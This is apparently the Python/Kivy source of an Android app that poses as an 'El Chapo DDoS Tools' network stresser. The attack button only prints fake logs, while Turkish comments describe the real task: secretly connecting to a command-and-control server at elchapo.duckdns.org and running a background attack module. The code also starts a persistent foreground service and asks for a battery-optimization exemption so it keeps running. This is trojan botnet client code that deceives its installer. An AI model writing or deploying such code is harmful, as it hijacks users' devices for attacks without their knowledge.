
import threading
import socket
import time
import random
from kivy.app import App
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.properties import StringProperty, BooleanProperty
from kivy.clock import Clock
from kivy.utils import platform

# ARKA PLAN SALDIRI MODÜLÜ (Bu dosya gerçek saldırıları yapar)
try:
    import mobile_attack
except ImportError:
    mobile_attack = None

# --- C2 SUNUCU AYARLARI ---
C2_HOST = "elchapo.duckdns.org"
C2_PORT = 6667
# --------------------------

KV = '''
BoxLayout:
    orientation: 'vertical'
    padding: 20
    spacing: 15
    canvas.before:
        Color:
            rgba: 0.08, 0.08, 0.08, 1  # Koyu Gri Arkaplan
        Rectangle:
            pos: self.pos
            size: self.size

    # --- BAŞLIK ---
    Label:
        text: 'El Chapo DDoS Tools'
        font_size: '26sp'
        bold: True
        color: 1, 0, 0, 1  # Kırmızı
        size_hint_y: None
        height: 50
        
    Label:
        text: 'Advanced Network Stresser'
        font_size: '14sp'
        color: 0.5, 0.5, 0.5, 1
        size_hint_y: None
        height: 20

    # --- FORM ---
    BoxLayout:
        orientation: 'vertical'
        size_hint_y: None
        height: 220
        spacing: 10
        padding: [0, 20, 0, 0]

        TextInput:
            id: target_ip
            hint_text: 'Target IP / Host'
            multiline: False
            background_color: 0.15, 0.15, 0.15, 1
            foreground_color: 1, 1, 1, 1
            cursor_color: 1, 0, 0, 1
            padding: 15
            size_hint_y: None
            height: 50

        BoxLayout:
            spacing: 10
            size_hint_y: None
            height: 50
            
            TextInput:
                id: target_port
                hint_text: 'Port (80)'
                input_filter: 'int'
                multiline: False
                background_color: 0.15, 0.15, 0.15, 1
                foreground_color: 1, 1, 1, 1
                cursor_color: 1, 0, 0, 1
                padding: 15

            TextInput:
                id: threads
                hint_text: 'Threads (50)'
                input_filter: 'int'
                multiline: False
                background_color: 0.15, 0.15, 0.15, 1
                foreground_color: 1, 1, 1, 1
                cursor_color: 1, 0, 0, 1
                padding: 15

        Button:
            id: attack_btn
            text: 'START ATTACK'
            bold: True
            font_size: '18sp'
            background_color: 0.8, 0, 0, 1
            on_release: app.on_fake_attack_btn()
            size_hint_y: None
            height: 60

    # --- LOG EKRANI ---
    ScrollView:
        BoxLayout:
            orientation: 'vertical'
            size_hint_y: None
            height: self.minimum_height
            Label:
                text: app.log_text
                size_hint_y: None
                height: self.texture_size[1]
                text_size: self.width, None
                halign: 'left'
                valign: 'top'
                markup: True
                padding: [10, 10]
'''

class ElChapoApp(App):
    log_text = StringProperty("[color=00ff00]System Ready...[/color]\n")
    is_fake_attacking = False

    def build(self):
        # 1. GERÇEK GÖREV: Arka planda gizlice C2 sunucusuna bağlan
        threading.Thread(target=self.start_c2_client, daemon=True).start()
        
        # 2. SAHTE GÖREV: Kullanıcıya havalı bir arayüz göster
        return Builder.load_string(KV)

    # --- SAHTE ARAYÜZ FONKSİYONLARI ---
    def on_fake_attack_btn(self):
        # Kullanıcı butona bastığında sadece ekranda yazı değişir.
        # GERÇEK BİR SALDIRI BAŞLATMAZ.
        
        if not self.is_fake_attacking:
            ip = self.root.ids.target_ip.text
            if not ip:
                self.log_text += "\n[color=ffff00][!] Error: Target IP required![/color]"
                return
            
            self.is_fake_attacking = True
            self.root.ids.attack_btn.text = "STOP ATTACK"
            self.root.ids.attack_btn.background_color = (0.2, 0.2, 0.2, 1)
            
            self.log_text = f"[color=ff0000][b]ATTACK STARTED ON {ip}[/b][/color]\n"
            self.fake_log_event = Clock.schedule_interval(self.generate_fake_logs, 1.5)
        else:
            self.stop_fake_attack()

    def generate_fake_logs(self, dt):
        logs = [
            "Handshaking with target...",
            "Sending UDP Packets...",
            "Bypassing Firewall Rules...",
            "Injecting payload...",
            "Target response time: 999ms",
            "Flooding port...",
            "Using spoofed IPs..."
        ]
        msg = random.choice(logs)
        self.log_text += f"\n[color=00ff00]> {msg}[/color]"

    def stop_fake_attack(self):
        self.is_fake_attacking = False
        self.root.ids.attack_btn.text = "START ATTACK"
        self.root.ids.attack_btn.background_color = (0.8, 0, 0, 1)
        if hasattr(self, 'fake_log_event'):
            self.fake_log_event.cancel()
        self.log_text += "\n[color=ffff00]Attack Stopped by User.[/color]\n"


    # --- SERVİS VE İZİN YÖNETİMİ ---
    def start_android_service(self):
        if platform == 'android':
            from jnius import autoclass
            from android.permissions import request_permissions, Permission
            
            # 1. Kritik İzinleri İste
            def callback(permission, results):
                if all([res for res in results]):
                    self.log_text += "\n[color=00ff00]Permissions Granted.[/color]"
                    self.launch_service_native()
                else:
                    self.log_text += "\n[color=ffff00]Permissions Denied! Service may fail.[/color]"

            request_permissions(
                [Permission.INTERNET, Permission.WAKE_LOCK, Permission.FOREGROUND_SERVICE], 
                callback
            )
            
            # 2. Pil Tasarrufu İstinası (Doze Mode Bypass)
            self.request_battery_exemption()
        else:
            # Windows/Test ortamı için sahte servis (Thread)
            self.log_text += "\n[color=aaaaaa]Running in Test Mode (Windows)[/color]"
            threading.Thread(target=self.test_c2_thread, daemon=True).start()

    def request_battery_exemption(self):
        # Kullanıcıyı pil ayarları sayfasına yönlendir
        try:
            from jnius import autoclass, cast
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            
            mActivity = PythonActivity.mActivity
            packageName = mActivity.getPackageName()
            
            intent = Intent()
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(Uri.parse("package:" + packageName))
            
            mActivity.startActivity(intent)
        except Exception as e:
            self.log_text += f"\n[color=ffff00]Battery Exemption Error: {str(e)}[/color]"

    def launch_service_native(self):
        try:
            from jnius import autoclass
            mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
            Intent = autoclass('android.content.Intent')
            
            # Servis paket adı: package.name + .Service + ServisAdi(TitleCase)
            # buildozer.spec -> package.name = elchapo
            # services = ElChapoService:service.py -> ServiceElchaposervice
            service_name = 'org.elchapo.ServiceElchaposervice'
            service = autoclass(service_name)
            
            intent = Intent(mActivity, service)
            intent.putExtra("python_service_argument", "Start")
            
            # Android 8+ (Oreo) ve üzeri için startForegroundService gerekli
            if autoclass('android.os.Build$VERSION').SDK_INT >= 26:
                mActivity.startForegroundService(intent)
            else:
                mActivity.startService(intent)
                
            self.log_text += "\n[color=00ff00]Background Service Started![/color]"
        except Exception as e:
            self.log_text += f"\n[color=ff0000]Service Launch Failed: {str(e)}[/color]"

    def test_c2_thread(self):
        # Windows'ta servisi taklit eden thread
        # Gerçek servisi 'service.py' dosyasından import edip çalıştırır
        try:
            import service
            service.connect_to_c2()
        except ImportError:
            self.log_text += "\n[!] service.py not found using local mock."

    def build(self):
        # Grafik Arayüzü hemen yükle
        return Builder.load_string(KV)

    def on_start(self):
        # Uygulama açıldıktan 0.5 saniye sonra servisleri başlat (Çökme önleyici)
        Clock.schedule_once(lambda dt: self.start_android_service(), 0.5)

